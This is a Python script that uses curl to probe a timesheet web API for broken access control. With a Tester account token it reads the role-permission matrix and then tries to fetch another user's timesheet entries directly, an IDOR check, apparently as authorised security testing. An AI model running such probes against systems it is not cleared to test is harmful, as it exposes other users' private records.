import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
def get(p,tok):
    cmd=['curl','-s','-m','25','-o','/tmp/b','-w','%{http_code}',H+p,'-H','token: '+tok,'-H',BB]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== does the RBAC matrix grant timesheet read to Tester? ===")
tok=open('/tmp/bac_TESTER').read().strip()
c,b=get('/api/v1/role_permissions?role_id=4',tok)
try:
    rp=json.loads(b)['role_permissions']
    hits=[x for x in rp if 'timesheet' in str(x.get('key','')).lower()]
    print(f"  role 4 timesheet-related perms: {len(hits)}")
    for x in hits[:12]:
        print(f"    {x.get('key'):34} {x.get('value')}")
except Exception as e: print("  ",c,b[:150])
print()
print("=== and for Owner (role 5)? ===")
c,b=get('/api/v1/role_permissions?role_id=5',tok)
try:
    rp=json.loads(b)['role_permissions']
    hits=[x for x in rp if 'timesheet' in str(x.get('key','')).lower()]
    print(f"  role 5 timesheet-related perms: {len(hits)}")
    for x in hits[:12]:
        print(f"    {x.get('key'):34} {x.get('value')}")
except Exception as e: print("  ",c,b[:150])
print()
print("=== single-entry IDOR: can Tester read user 1's entry directly? ===")
# find an entry belonging to user 1
c,b=get('/api/v1/timesheet_entries',tok)
ts=json.loads(b)['timesheet_entries']
u1=[t for t in ts if t.get('user_id')==1][:2]
for t in u1:
    eid=t['id']
    c2,b2=get(f'/api/v1/timesheet_entries/{eid}',tok)
    print(f"  entry {eid} (user 1) -> {c2} {b2[:130].replace(chr(10),' ')}")
